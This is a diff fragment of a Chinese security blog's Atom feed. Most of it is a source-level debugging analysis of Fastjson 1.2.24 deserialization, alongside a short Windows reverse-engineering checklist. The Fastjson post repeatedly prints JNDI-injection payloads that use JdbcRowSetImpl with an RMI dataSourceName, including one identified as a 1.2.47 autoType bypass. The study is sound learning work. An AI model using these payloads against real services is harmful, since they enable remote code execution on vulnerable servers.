xml:base="https://citrusice.github.io/posts/importing-bookmarks-to-zotero/">&lt;p&gt;接触安全已有两年，这期间看了大量的文章，其中大部分都使用浏览器的收藏夹来保存，还有一小部分用印象笔记的网页剪藏。以书签的方式保存文章并不可靠，经常会遇到文章被删或者由于一些博主换了博客主题而导致之前的url不可用。印象笔记的剪藏固然很好，然而我并不敢投入太多在印象笔记之中（并不是很满意印象笔记，一直在搜寻可替代的软件，投入太多会导致迁移成本的增加），直到朋友向我推荐了Zotero。&lt;/p&gt;
 
 &lt;p&gt;Zotero是一个用于文档管理的开源软件，并且提供浏览器插件用于保存网页，但是并没有提供批量导入的功能，因此只有通过自己实现了。&lt;/p&gt;
 
@@ -1260,97 +1471,4 @@ main:41, test (test)
 
 &lt;p&gt;1.2.24：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233548941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="java" /><summary type="html">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧 分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松 调试用的代码 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; Group group = JSON.parseObject(jsonString, Group.class); 从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner JSONScanner JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部 JSONLexerBase有几个成员变量 protected int token; protected int pos; protected int features; protected char ch; protected int bp;//当前指向的位置 protected int eofPos; /** * A character buffer for literals. */ protected char[] sbuf; protected int sp; /** * number start position */ protected int np; 同时JSONScanner也新定义了两个 private final String text; //反序列化的字符串 private final int len;//字符串长度 //将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符 public final char next() { int index = ++bp; return ch = (index &amp;gt;= this.len ? // EOI // : text.charAt(index)); } JSONScanner的初始化 public JSONScanner(String input, int features){ super(features); text = input; len = text.length(); bp = -1; next(); if (ch == 65279) { // utf-8 bom next(); } } DefaultJSONParser 不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化 在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建 进入这个函数 public ObjectDeserializer getDeserializer(Type type) { //首先会在已有的deserializer中找，this.derializers是一个hashmap ObjectDeserializer derializer = this.derializers.get(type); if (derializer != null) { return derializer; } //没有找着就接着找 if (type instanceof Class&amp;lt;?&amp;gt;) { return getDeserializer((Class&amp;lt;?&amp;gt;) type, type); } ………………省略…………………… } 进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中 public ObjectDeserializer getDeserializer(Class&amp;lt;?&amp;gt; clazz, Type type) { //继续匹配 ObjectDeserializer derializer = derializers.get(type); if (derializer != null) { return derializer; } if (type == null) { type = clazz; } //继续匹配 derializer = derializers.get(type); if (derializer != null) { return derializer; } { JSONType annotation = clazz.getAnnotation(JSONType.class); if (annotation != null) { Class&amp;lt;?&amp;gt; mappingTo = annotation.mappingTo(); if (mappingTo != Void.class) { return getDeserializer(mappingTo, mappingTo); } } } //判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道 if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) { derializer = derializers.get(clazz); } if (derializer != null) { return derializer; } //反序列化的类是否在denyList中 String className = clazz.getName(); className = className.replace('$', '.'); for (int i = 0; i &amp;lt; denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(&quot;parser deny : &quot; + className); } } 之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer 如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false 先跟进asm为false的情况，直接new一个JavaBeanDeserializer JavaBeanDeserializer //其中定义的一些成员变量 private final FieldDeserializer[] fieldDeserializers; protected final FieldDeserializer[] sortedFieldDeserializers; protected final Class&amp;lt;?&amp;gt; clazz; public final JavaBeanInfo beanInfo; private ConcurrentMap&amp;lt;String, Object&amp;gt; extraFieldDeserializers; com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法 最后返回一个JavaBeanInfo类 在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields public JavaBeanInfo(Class&amp;lt;?&amp;gt; clazz, // Class&amp;lt;?&amp;gt; builderClass, // Constructor&amp;lt;?&amp;gt; defaultConstructor, // Constructor&amp;lt;?&amp;gt; creatorConstructor, // Method factoryMethod, // Method buildMethod, // JSONType jsonType, // List&amp;lt;FieldInfo&amp;gt; fieldList){ this.clazz = clazz; this.builderClass = builderClass; this.defaultConstructor = defaultConstructor; this.creatorConstructor = creatorConstructor; this.factoryMethod = factoryMethod; this.parserFeatures = TypeUtils.getParserFeatures(clazz); this.buildMethod = buildMethod; ....省略..... fields = new FieldInfo[fieldList.size()]; fieldList.toArray(fields); FieldInfo[] sortedFields = new FieldInfo[fields.length]; System.arraycopy(fields, 0, sortedFields, 0, fields.length); Arrays.sort(sortedFields); ....省略..... } 在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中 至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化 fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349 从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值 当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理 之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object) 判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析 当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader) 之后会根据clazz获取deserializer进行反序列化 用asm来生成处理类的情况： 也就是当asmEnable为true的情况 截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了 为什么要有autoType功能 在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问 https://github.com/alibaba/fastjson/issues/3218 当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息 遇到的问题 测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功 使用payload1 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1 调用栈 popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser) parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 看了一下，是因为执行这条语句是contextArrayIndex为0导致的 经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是 {&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;} {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true} 所以导致数组越界 再调试另一种payload String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在 deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) 下面是调用堆栈 addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser) setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:105, StringCodec (com.alibaba.fastjson.serializer) deserialze:87, StringCodec (com.alibaba.fastjson.serializer) parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错 感觉像是代码的bug 验证： 通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败 1.2.47： 1.2.24：</summary></entry><entry><title type="html">逆向的一些总结</title><link href="https://citrusice.github.io/posts/re-summarize/" rel="alternate" type="text/html" title="逆向的一些总结" /><published>2020-07-09T18:35:43+08:00</published><updated>2020-07-09T18:35:43+08:00</updated><id>https://citrusice.github.io/posts/re-summarize</id><content type="html" xml:base="https://citrusice.github.io/posts/re-summarize/">&lt;p&gt;最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;观察程序行为&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;文件操作&lt;/li&gt;
-      &lt;li&gt;注册表读写&lt;/li&gt;
-      &lt;li&gt;dll调用&lt;/li&gt;
-      &lt;li&gt;……&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;procmon&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;定位关键代码&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;搜索字符串特征&lt;/li&gt;
-      &lt;li&gt;相关windows api
-        &lt;ul&gt;
-          &lt;li&gt;CreateFile&lt;/li&gt;
-          &lt;li&gt;ReadFile&lt;/li&gt;
-          &lt;li&gt;WriteFile&lt;/li&gt;
-          &lt;li&gt;……&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;内存断点&lt;/li&gt;
-      &lt;li&gt;函数特征，ida signature，findcrypt&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;代码分析&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;动态分析 =&amp;gt; 分析具体行为&lt;/li&gt;
-      &lt;li&gt;静态分析 =&amp;gt; 分析调用关系，程序逻辑&lt;/li&gt;
-      &lt;li&gt;关注数据流向&lt;/li&gt;
-      &lt;li&gt;类的识别&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;逆不动？&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;注入进程寻找解密后的数据&lt;/li&gt;
-      &lt;li&gt;找到解密函数直接调用&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;未解决的问题以及可能的解决方案&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;
-        &lt;p&gt;结构体及类的逆向&lt;/p&gt;
-
-        &lt;p&gt;下次可以尝试使用reclass&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码&lt;/p&gt;
-
-        &lt;ul&gt;
-          &lt;li&gt;
-            &lt;p&gt;ce搜索指针链，一层一层定位初始化代码&lt;/p&gt;
-          &lt;/li&gt;
-          &lt;li&gt;
-            &lt;p&gt;下断new，malloc、VirtualAlloc等函数，定位构造函数&lt;/p&gt;
-          &lt;/li&gt;
-          &lt;li&gt;
-            &lt;p&gt;根据构造函数特征定位构造函数&lt;/p&gt;
-
-            &lt;ul&gt;
-              &lt;li&gt;
-                &lt;p&gt;使用ecx传参（类函数特征）&lt;/p&gt;
-              &lt;/li&gt;
-              &lt;li&gt;
-                &lt;p&gt;函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx&lt;/p&gt;
-
-                &lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-195449.htm&quot;&gt;https://bbs.pediy.com/thread-195449.htm&lt;/a&gt;&lt;/p&gt;
-
-                &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/predator-wang/p/8031071.html&quot;&gt;https://www.cnblogs.com/predator-wang/p/8031071.html&lt;/a&gt;&lt;/p&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ps：&lt;/p&gt;
-
-&lt;p&gt;web手做逆向，有点惨&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下 观察程序行为 文件操作 注册表读写 dll调用 …… procmon 定位关键代码 搜索字符串特征 相关windows api CreateFile ReadFile WriteFile …… 内存断点 函数特征，ida signature，findcrypt 代码分析 动态分析 =&amp;gt; 分析具体行为 静态分析 =&amp;gt; 分析调用关系，程序逻辑 关注数据流向 类的识别 逆不动？ 注入进程寻找解密后的数据 找到解密函数直接调用 未解决的问题以及可能的解决方案 结构体及类的逆向 下次可以尝试使用reclass 在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码 ce搜索指针链，一层一层定位初始化代码 下断new，malloc、VirtualAlloc等函数，定位构造函数 根据构造函数特征定位构造函数 使用ecx传参（类函数特征） 函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx https://bbs.pediy.com/thread-195449.htm https://www.cnblogs.com/predator-wang/p/8031071.html ps： web手做逆向，有点惨</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233548941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="java" /><summary type="html">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧 分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松 调试用的代码 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; Group group = JSON.parseObject(jsonString, Group.class); 从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner JSONScanner JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部 JSONLexerBase有几个成员变量 protected int token; protected int pos; protected int features; protected char ch; protected int bp;//当前指向的位置 protected int eofPos; /** * A character buffer for literals. */ protected char[] sbuf; protected int sp; /** * number start position */ protected int np; 同时JSONScanner也新定义了两个 private final String text; //反序列化的字符串 private final int len;//字符串长度 //将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符 public final char next() { int index = ++bp; return ch = (index &amp;gt;= this.len ? // EOI // : text.charAt(index)); } JSONScanner的初始化 public JSONScanner(String input, int features){ super(features); text = input; len = text.length(); bp = -1; next(); if (ch == 65279) { // utf-8 bom next(); } } DefaultJSONParser 不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化 在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建 进入这个函数 public ObjectDeserializer getDeserializer(Type type) { //首先会在已有的deserializer中找，this.derializers是一个hashmap ObjectDeserializer derializer = this.derializers.get(type); if (derializer != null) { return derializer; } //没有找着就接着找 if (type instanceof Class&amp;lt;?&amp;gt;) { return getDeserializer((Class&amp;lt;?&amp;gt;) type, type); } ………………省略…………………… } 进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中 public ObjectDeserializer getDeserializer(Class&amp;lt;?&amp;gt; clazz, Type type) { //继续匹配 ObjectDeserializer derializer = derializers.get(type); if (derializer != null) { return derializer; } if (type == null) { type = clazz; } //继续匹配 derializer = derializers.get(type); if (derializer != null) { return derializer; } { JSONType annotation = clazz.getAnnotation(JSONType.class); if (annotation != null) { Class&amp;lt;?&amp;gt; mappingTo = annotation.mappingTo(); if (mappingTo != Void.class) { return getDeserializer(mappingTo, mappingTo); } } } //判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道 if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) { derializer = derializers.get(clazz); } if (derializer != null) { return derializer; } //反序列化的类是否在denyList中 String className = clazz.getName(); className = className.replace('$', '.'); for (int i = 0; i &amp;lt; denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(&quot;parser deny : &quot; + className); } } 之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer 如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false 先跟进asm为false的情况，直接new一个JavaBeanDeserializer JavaBeanDeserializer //其中定义的一些成员变量 private final FieldDeserializer[] fieldDeserializers; protected final FieldDeserializer[] sortedFieldDeserializers; protected final Class&amp;lt;?&amp;gt; clazz; public final JavaBeanInfo beanInfo; private ConcurrentMap&amp;lt;String, Object&amp;gt; extraFieldDeserializers; com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法 最后返回一个JavaBeanInfo类 在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields public JavaBeanInfo(Class&amp;lt;?&amp;gt; clazz, // Class&amp;lt;?&amp;gt; builderClass, // Constructor&amp;lt;?&amp;gt; defaultConstructor, // Constructor&amp;lt;?&amp;gt; creatorConstructor, // Method factoryMethod, // Method buildMethod, // JSONType jsonType, // List&amp;lt;FieldInfo&amp;gt; fieldList){ this.clazz = clazz; this.builderClass = builderClass; this.defaultConstructor = defaultConstructor; this.creatorConstructor = creatorConstructor; this.factoryMethod = factoryMethod; this.parserFeatures = TypeUtils.getParserFeatures(clazz); this.buildMethod = buildMethod; ....省略..... fields = new FieldInfo[fieldList.size()]; fieldList.toArray(fields); FieldInfo[] sortedFields = new FieldInfo[fields.length]; System.arraycopy(fields, 0, sortedFields, 0, fields.length); Arrays.sort(sortedFields); ....省略..... } 在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中 至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化 fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349 从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值 当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理 之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object) 判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析 当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader) 之后会根据clazz获取deserializer进行反序列化 用asm来生成处理类的情况： 也就是当asmEnable为true的情况 截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了 为什么要有autoType功能 在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问 https://github.com/alibaba/fastjson/issues/3218 当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息 遇到的问题 测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功 使用payload1 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1 调用栈 popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser) parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 看了一下，是因为执行这条语句是contextArrayIndex为0导致的 经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是 {&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;} {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true} 所以导致数组越界 再调试另一种payload String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在 deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) 下面是调用堆栈 addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser) setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:105, StringCodec (com.alibaba.fastjson.serializer) deserialze:87, StringCodec (com.alibaba.fastjson.serializer) parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错 感觉像是代码的bug 验证： 通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败 1.2.47： 1.2.24：</summary></entry></feed>
